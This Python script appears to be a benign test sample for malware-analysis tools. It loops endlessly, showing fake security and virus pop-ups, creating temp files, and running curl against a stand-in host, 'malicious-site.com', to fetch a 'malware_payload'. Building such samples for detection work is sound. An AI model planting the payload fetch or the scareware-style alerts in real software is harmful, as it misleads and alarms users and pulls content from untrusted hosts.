import random
import time
import subprocess
import threading
import os

# List of hardcoded pop-up messages for static analysis detection
messages = [
    "System update required!",
    "Security alert: Unauthorized access detected.",
    "Warning: Disk space running low.",
    "Pop-up triggered for testing purposes.",
    "Virus detected in memory! Immediate action needed.",
    "Warning! CPU usage exceeded 90%!"
]

# Hardcoded strings to make the malware detectable during static analysis
malicious_strings = [
    "C:\\Program Files\\Malware\\payload.exe",
    "http://malicious-site.com/malware_payload",
    "/tmp/tempfile_for_exploit.txt",
    "Accessing system logs for analysis."
]

# Function to create a pop-up using Zenity
def show_popup(message, invisible=False):
    if invisible:
        message = ""
    subprocess.run(['zenity', '--info', '--text', message, '--title', 'Security Alert'])

# Function to simulate file system interactions (creating and deleting files)
def file_system_activity():
    file_name = f'/tmp/test_file_{random.randint(1, 10000)}.txt'
    with open(file_name, 'w') as f:
        f.write('Malware resource exhaustion triggered.')
    os.remove(file_name)
    time.sleep(random.randint(1, 3))

# Function to introduce a race condition that shows multiple pop-ups
def race_condition_popup():
    def thread_func():
        message = random.choice(messages)
        show_popup(message)
    
    threads = []
    for _ in range(5):  # Spawn 5 threads to simulate a race condition
        thread = threading.Thread(target=thread_func)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Function to simulate network activity (e.g., calling a malicious URL)
def network_activity():
    # Static network activity: hardcoded URL for analysis tools to detect
    subprocess.run(['curl', 'http://malicious-site.com/malware_payload'])

# Function to simulate polymorphic behavior
def polymorphic_behavior():
    action = random.choice([show_popup, file_system_activity, network_activity])

    # Ensure that show_popup gets the required 'message' argument
    if action == show_popup:
        message = random.choice(messages)  # Pick a random message for the pop-up
        action(message)  # Now show_popup is called with the required message
    else:
        action()  # For file_system_activity and network_activity, no message is needed

# Trigger pop-ups, file system interactions, and network activity
def trigger_activities():
    while True:
        activity_type = random.choice(['normal', 'file_activity', 'race_condition', 'network_activity', 'polymorphic'])

        if activity_type == 'normal':
            message = random.choice(messages)
            show_popup(message)
        elif activity_type == 'file_activity':
            file_system_activity()
        elif activity_type == 'race_condition':
            race_condition_popup()
        elif activity_type == 'network_activity':
            network_activity()
        elif activity_type == 'polymorphic':
            polymorphic_behavior()

        time.sleep(random.randint(3, 10))

# Start the background process for triggering activities
def start_background_processes():
    threading.Thread(target=trigger_activities, daemon=True).start()

if __name__ == "__main__":
    start_background_processes()
    while True:
        time.sleep(1)  # Keep the program running to allow time for static and dynamic analysis
